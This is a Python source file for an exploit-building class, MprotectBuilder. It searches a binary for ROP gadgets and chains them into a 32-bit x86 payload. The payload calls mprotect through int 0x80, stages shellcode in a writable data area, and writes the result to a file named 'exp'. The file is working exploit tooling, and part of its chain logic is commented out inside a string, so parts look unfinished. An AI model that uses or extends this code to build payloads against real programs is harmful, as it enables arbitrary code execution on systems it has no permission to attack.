from struct import pack
from src.GadgetFinder import *

class MprotectBuilder():
    def __init__(self, regs) -> None:
        self.regs = regs
        self.SRC = 'eax'
        self.DST = 'edx'
        self.init_gadgets = {}
        self.gadget_finder = GadgetFinder()
        self.gadgets = {}
        self.chain = b''

    def find_xor_src(self, stdout):
        instructions = []
        for src in self.regs:
            instructions.append(Instruction('xor ' + src + ', ' + src, ['esp']))

        self.gadget_finder.start(stdout, instructions, 1, 3)
        
        ins, gad = self.gadget_finder.find_lowest_complexity()
        self.SRC = ins.split(' ')[1][:-1]
        self.init_gadgets[ins] = gad
        self.gadget_finder.gadgets.clear()
        
    def find_mov_dst(self, stdout):
        instructions = []
        for dst in self.regs:
            if dst == self.SRC: continue
            instructions.append(Instruction('mov dword ptr [' + dst + '], ' + self.SRC, ['esp']))

        self.gadget_finder.start(stdout, instructions, 2, 3)

        ins, gad = self.gadget_finder.find_lowest_complexity()
        self.DST = ins.split('[')[1].split(']')[0]
        self.init_gadgets[ins] = gad


    def pad_pop_reg(self, reg, data, used_regs = {}):
        gadget = self.gadgets['pop ' + reg]
        p = gadget.compile()
        for r in gadget.side_pops:
            if r == reg: p += data
            else: 
                if r in used_regs.keys(): p += pack('<I', used_regs[r])
                else: p += pack('<I', 0x41414141)
        return p
    
    def pad_xor_reg(self, reg, used_regs = {}):
        gadget = self.gadgets['xor ' + reg + ", " + reg]
        p = gadget.compile()
        for r in gadget.side_pops:
            if r in used_regs.keys(): p += pack('<I', used_regs[r])
            else: p += pack('<I', 0x41414141)
        return p
    

    def build_stack_bytes(self, p, s, offset):
        bound = math.ceil(len(s) / 4)
        for i in range(0, bound):
            p += self.pad_pop_reg(self.DST, pack('<I', self.DATA + offset + i*4))
            d = s[i*4:i*4+4] if i*4+4 <= len(s) else s[i*4:len(s)] + b'A' * (bound*4 - len(s))
            p += self.pad_pop_reg(self.SRC, d)
            p += self.gadgets['mov dword ptr [' + self.DST + '], ' + self.SRC].compile()
        
        p += self.pad_pop_reg(self.DST, pack('<I', self.DATA + offset + len(s)))
        p += self.gadgets['xor ' + self.SRC + ", " + self.SRC].compile()
        p += self.gadgets['mov dword ptr [' + self.DST + '], ' + self.SRC].compile()

        return p
    

    def build_chain(self, stdout, shellcode, padding = 0):
        self.gadget_finder = GadgetFinder(self.init_gadgets)

        instructions = [
            Instruction('pop eax', ['esp']),
            Instruction('pop ebx', ['esp']),
            Instruction('pop ecx', ['esp']),
            Instruction('pop edx', ['esp']),
            Instruction('xor ecx, ecx', ['esp']),
            Instruction('xor edx, edx', ['esp']),
            Instruction('inc ecx', ['esp']),
            Instruction('add ecx, ecx', ['esp']),
            Instruction('inc edx', ['esp']),
            Instruction('dec ebx', ['esp']),
            Instruction('inc eax', ['esp']),
            Instruction('int 0x80', ['esp'])
        ]

        if self.SRC != 'eax': instructions.append(Instruction('xor eax, eax', ['esp']))

        self.gadget_finder.start(stdout, instructions, 3, 3)
        self.gadgets = self.gadget_finder.gadgets
        self.DATA = self.gadget_finder.data

        p = b'A'*padding
        
        p += self.gadgets['xor eax, eax'].compile()
        for _ in range(0, 0x5a): p += self.gadgets['inc edx'].compile()
        for _ in range(0, 1): p += self.gadgets['add ecx, ecx'].compile()

        for __ in range(0, 5): p += self.gadgets['inc edx'].compile()

        for _ in range(0, 0x7d): p += self.gadgets['inc eax'].compile()
        
        
        '''offset = 0

        p = self.build_stack_bytes(p, shellcode, offset)
        offset += len(shellcode) + 1

        p += self.pad_pop_reg('ebx', pack('<I', self.DATA))
        p += self.pad_pop_reg('ecx', pack('<I', self.DATA), {'ebx': self.DATA})
        
        p += self.pad_xor_reg('ecx', {'ebx': self.DATA})
        p += self.pad_xor_reg('edx', {'ebx': self.DATA, 'ecx': self.DATA})

        for _ in range(0, 96): p += self.gadgets['dec ebx'].compile()

        p += self.gadgets['inc ecx'].compile()
        for _ in range(0, 1): p += self.gadgets['add ecx, ecx'].compile()

        for __ in range(0, 5): p += self.gadgets['inc edx'].compile()

        for _ in range(0, 0x7d): p += self.gadgets['inc eax'].compile()

        p += self.gadgets['int 0x80'].compile()
        p += pack('<I', self.DATA)'''
        self.chain = p

        formatted_bytes = ' '.join([str(hex(int.from_bytes(self.chain[i:i+4], "little"))) for i in range(0, len(self.chain), 4)])

        print(formatted_bytes)


    def write_chain(self):
        out_file = open('exp', 'wb')
        out_file.write(self.chain)



